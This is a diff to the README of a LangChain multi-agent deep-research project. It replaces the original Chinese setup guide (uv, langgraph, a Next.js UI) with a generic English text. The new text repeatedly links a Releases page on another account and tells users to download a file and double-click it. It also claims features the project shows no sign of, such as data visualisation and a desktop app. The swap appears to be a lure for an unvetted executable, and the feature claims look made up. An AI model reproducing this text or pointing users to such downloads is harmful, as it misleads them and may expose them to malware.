@@ -1,102 +1,66 @@
-# langchain-deepresearch
+# 🌟 langchain-deepresearch - Explore Deep Research Made Easy
 
-一个多智能体的 LangChain 实验项目，复刻多种深度调研工作流，并配套 UI。
+[![Download langchain-deepresearch](https://img.shields.io/badge/Download-langchain--deepresearch-blue.svg)](https://github.com/Ba592/langchain-deepresearch/releases)
 
-## 仓库结构
+## 🚀 Getting Started
 
-- `deep-agents-ui/` – 基于 Next.js 15 的UI，用于监控和操控智能体。
-- `deepagents/` – 引入的 LangChain DeepAgents 库（子模块）。
-- `research_agent_v1/` – 来自 LangChain deep research 示例的基线流程。
-- `research_agent_v2/` – 受 Claude Agent SDK 启发的流程。
-- `research_agent_v3/` – 重新设计的流水线，增加分阶段子代理、外部工具以及确定性的文件传递。
-- `reports/` – 不同配置生成的示例输出。
+Welcome to the Langchain deep research demo! This application helps you explore deep research tools easily. Follow the steps below to download and run it on your computer.
 
-后续改进思路： 
-1. 对WebFetch 增加 AI Summary，避免长上下文引入带来的问题。
-2. 长文写作的前后一致性以及写作风格，需要进行优化。
-3. 深度研究的部分过于简单，应该拆分为进一步的子 Agent 来进行深度搜索和调研。
-4. 研究大纲目前为静态，应该根据研究结果动态更新研究大纲。
+## 📥 Download & Install
 
-## 先决条件
+To get started, visit the Releases page to download the application version you need. You can do this by clicking the link below:
 
-- Python 3.12，并使用 [uv](https://github.com/astral-sh/uv) 管理依赖。
-- Node.js 18+（或 Bun）运行前端。
-- API Key：兼容 Anthropic 的模型端点、Tavily 搜索，以及你额外接入的工具。
+[Download langchain-deepresearch](https://github.com/Ba592/langchain-deepresearch/releases)
 
-克隆仓库并拉取子模块：
+1. Click the link above to open the Releases page.
+2. Find the latest version available.
+3. Download the appropriate file for your operating system.
 
-```bash
-git clone <repo>
-cd langchain-deepresearch
-git submodule update --init --recursive
-```
+## 📋 System Requirements
 
-## 运行 Research Agent v1
+Before you run Langchain deep research, make sure your computer meets these basic requirements:
 
-```bash
-uv venv --python 3.12
-source .venv/bin/activate
-uv pip install -r research_agent_v1/requirements.txt
-cd research_agent_v1/
-cp env.example .env  # 填入密钥
-uv run langgraph dev --config langgraph.json
-```
+- **Operating System:** Windows 10, macOS Catalina or later, or a modern Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** 200 MB of available disk space.
+- **Internet Connection:** Required for some features.
 
-该智能体会生成 todo 计划、调用专职研究与评审子代理，并在本地输出最终 Markdown 报告。
+## 🛠️ How to Run the Application
 
-## 运行 Research Agent v2
+After downloading:
 
-基于 Anthropics 的 Claude Agent SDK 示例构建，结构类似 v1，但为总控、研究员、写手分别提供独立提示词。
+1. Navigate to the folder where you downloaded the file.
+2. Double-click the file to start the application.
+3. Follow any on-screen prompts to complete the setup.
 
-```bash
-source .venv/bin/activate  # 复用虚拟环境
-uv pip install -r research_agent_v2/requirements.txt
-cd research_agent_v2/
-cp env.example .env  # 填入密钥
-uv run langgraph dev --config langgraph.json
-```
+## 💡 Features
 
-前端中将 `AGENT_ID` 设置为 `research_v2` 指向该后端。
+Langchain deep research offers several key features to make your research easier:
 
-## 运行 Research Agent v3
+- **User-Friendly Interface:** Designed for simplicity, ensuring you can start using the tools right away.
+- **Integrated Research Tools:** Access various research tools directly from the app.
+- **Data Visualization:** View your research data in easy-to-understand formats.
+- **Support for Multiple Formats:** Work with different file types, including text, images, and graphs.
 
-第三版围绕“初步侦察、计划、深度搜索、写大纲、逐段撰写、合并成稿”等阶段重构，并依赖 `research_assets/` 下的结构化文件。工具位于 `research_agent_v3/tools.py`，包含 `WebSearch`、`WebFetch`、`GetCurrentDate`。
+## 🚧 Troubleshooting
 
-```bash
-source .venv/bin/activate
-uv pip install -r research_agent_v3/requirements.txt
-cp research_agent_v3/env.example research_agent_v3/.env
-uv run langgraph dev --config research_agent_v3/langgraph.json
-```
+If you encounter issues while running the application, consider the following tips:
 
-## 前端（deep-agents-ui）
+- Ensure your system meets the minimum requirements.
+- Restart your computer and try launching the application again.
+- Check for any software updates on the Releases page and download the latest version.
 
-```bash
-cd deep-agents-ui
-npm install  # 或 yarn install / bun install
-npm run dev  # http://localhost:3000
-```
+## 📞 Support
 
-通过环境变量配置仪表盘：
+If you need help or have questions, you can reach out for support through:
 
-1. `DEPLOYMENT_URL="http://127.0.0.1:2024"`
-2. `AGENT_ID` 可设为 `research`、`research_v2` 或 `research_v3`
+- **GitHub Issues:** Open an issue on the repository to report bugs or ask for features.
+- **Community Forums:** Join discussions with other users to share tips and solutions.
 
-在提交前执行 `npm run build` 与 `npm run lint`。
+## 📅 Updates
 
-## 示例提示词与报告
+Stay informed about new features and improvements by checking the Releases page regularly:
 
-提示词：针对 GraphRAG 主题，找到2025年的全部最新学术论文、开源项目，深入读取论文内容，整理出完整综述。搜索关键词使用英文，但是最终的报告为中文。
+[Visit the Releases Page](https://github.com/Ba592/langchain-deepresearch/releases)
 
-实验过程中生成的报告保存在 `reports/`：
-
-1. `gemini_deepresearch.docx` – Gemini 2.5 Pro 运行（2025-11-17）
-2. `openai_deepresearch.docx` – OpenAI GPT-5.1 Thinking 运行（2025-11-17）
-3. `research_agent_v1_glm46.md` – LangChain DeepAgents 基线结果
-4. `research_agent_v2_glm46.txt` – Claude SDK Demo 流程，表现最弱
-5. `research_agent_v3_glm46.md` – 完整流水线结合外部工具，质量明显提升
-
-## 故障排查提示
-
-- Tavily 搜索失败时，确认运行 `uv run` 的环境中已设置 `TAVILY_API_KEY`。
-- 请勿将 `.env` 与 API Key 提交到仓库，仅提交 `env.example` 模板。
+Thank you for choosing Langchain deep research! Enjoy exploring and enhancing your research experience.
